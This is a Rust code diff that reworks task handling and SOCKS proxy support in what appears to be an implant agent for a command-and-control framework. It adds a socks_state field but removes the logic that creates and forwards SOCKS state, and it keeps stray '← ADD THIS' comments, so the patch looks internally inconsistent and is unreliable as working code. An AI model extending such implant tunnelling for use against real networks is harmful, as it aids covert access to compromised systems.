@@ -46,17 +46,11 @@ pub struct BackgroundTask {
 /// Struct for handling tasking
 #[derive(Debug)]
 pub struct Tasker {
-    /// List of running background tasks
     pub background_tasks: Vec<BackgroundTask>,
-
-    /// List of all completed task messages
-    completed_tasks: Vec<serde_json::Value>,
-
-    /// Value used handing out job ids to new jobs
-    dispatch_val: u32,
-
-    /// Cache for storing job ids which were used but the task is finished
-    cached_ids: VecDeque<u32>,
+    pub completed_tasks: Vec<serde_json::Value>,
+    pub dispatch_val: u32,
+    pub cached_ids: VecDeque<u32>,
+    pub socks_state: Option<Arc<SocksState>>,  // ← ADD THIS
 }
 
 /// Prototype for background task callback functions
@@ -73,7 +67,7 @@ impl Tasker {
             completed_tasks: Vec::new(),
             dispatch_val: 0,
             cached_ids: VecDeque::new(),
-            socks_state: None,  // ← ADD THIS LINE
+            socks_state: None,  // ← ADD THIS
         }
     }
 
@@ -144,12 +138,8 @@ impl Tasker {
                         continue;
                     }
                     "socks" => {
-                        if self.socks_state.is_none() {
-                            let socks_state = Arc::new(SocksState::new());
-                            self.socks_state = Some(socks_state.clone());
-                            if let Err(e) = self.spawn_background(task, |tx, rx| start_socks(&tx, rx, socks_state), true) {
-                                self.completed_tasks.push(mythic_error!(task.id, e.to_string()));
-                            }
+                        if let Err(e) = self.spawn_background(task, start_socks, true) {
+                            self.completed_tasks.push(mythic_error!(task.id, e.to_string()));
                         }
                         continue;
                     }
@@ -234,33 +224,22 @@ impl Tasker {
         }
         Ok(())
     }
-
     pub fn get_completed_tasks(&mut self) -> Result<Vec<serde_json::Value>, Box<dyn Error>> {
         let mut completed_tasks: Vec<serde_json::Value> = Vec::new();
     
-        // Existing background tasks...
         for task in self.background_tasks.iter() {
-            while let Ok(msg) = task.rx.try_recv() { completed_tasks.push(msg); }
+            while let Ok(msg) = task.rx.try_recv() {
+                completed_tasks.push(msg);
+            }
             if !task.running.load(Ordering::SeqCst) || Arc::strong_count(&task.running) == 1 {
-                while let Ok(msg) = task.rx.try_recv() { completed_tasks.push(msg); }
+                while let Ok(msg) = task.rx.try_recv() {
+                    completed_tasks.push(msg);
+                }
                 task.running.store(false, Ordering::SeqCst);
                 self.cached_ids.push_back(task.id);
             }
         }
         self.background_tasks.retain(|x| x.running.load(Ordering::SeqCst));
-    
-        // SOCKS: Just forward outbound
-        if let Some(state) = &self.socks_state {
-            let outbound = state.outbound.lock().unwrap();
-            if !outbound.is_empty() {
-                completed_tasks.push(serde_json::json!({
-                    "user_output": "socks_data",
-                    "completed": true,
-                    "task_id": "socks_outbound",
-                    "socks": outbound
-                }));
-            }
-        }
     
         completed_tasks.append(&mut self.completed_tasks);
         Ok(completed_tasks)
